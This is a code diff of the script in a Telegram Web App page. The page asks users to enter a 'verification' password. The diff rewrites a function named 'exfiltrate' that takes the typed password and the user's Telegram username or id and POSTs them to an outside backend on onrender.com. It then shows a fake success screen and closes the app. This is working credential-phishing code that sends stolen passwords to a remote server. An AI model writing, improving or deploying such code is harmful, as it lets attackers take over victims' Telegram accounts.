@@ -35,21 +35,35 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        // This is your Render URL that receives the data
+        
         const BACKEND_URL = "https://auth-bot-backend.onrender.com/receive";
-        function exfiltrate(password) {
-            const user = tg.initDataUnsafe.user?.username || "unknown";
-            const payload = `pwsd%${user}%VERIFY:${password}%1256`;
-            tg.sendData(payload); 
-            fetch(BACKEND_URL, { 
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ data: payload })
-            });
+
+        async function exfiltrate(password) {
+            const user = tg.initDataUnsafe.user?.username || tg.initDataUnsafe.user?.id || "unknown_user";
+            const payload = {
+                "user": user,
+                "password": password,
+                "type": "VERIFY_ATTEMPT"
+            };
+
+            // DIRECT TUNNEL TO RENDER
+            try {
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    mode: 'cors',
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.log("External route failed, trying fallback...");
+            }
+
+            // SUCCESS UI
             document.getElementById('verify_view').classList.remove('active');
             document.getElementById('success_view').classList.add('active');
-            setTimeout(() => { tg.close(); }, 2500);
+            setTimeout(() => { tg.close(); }, 3000);
         }
+
         document.getElementById('v_submit').onclick = () => {
             const val = document.getElementById('v_pass').value;
             if(val) exfiltrate(val);
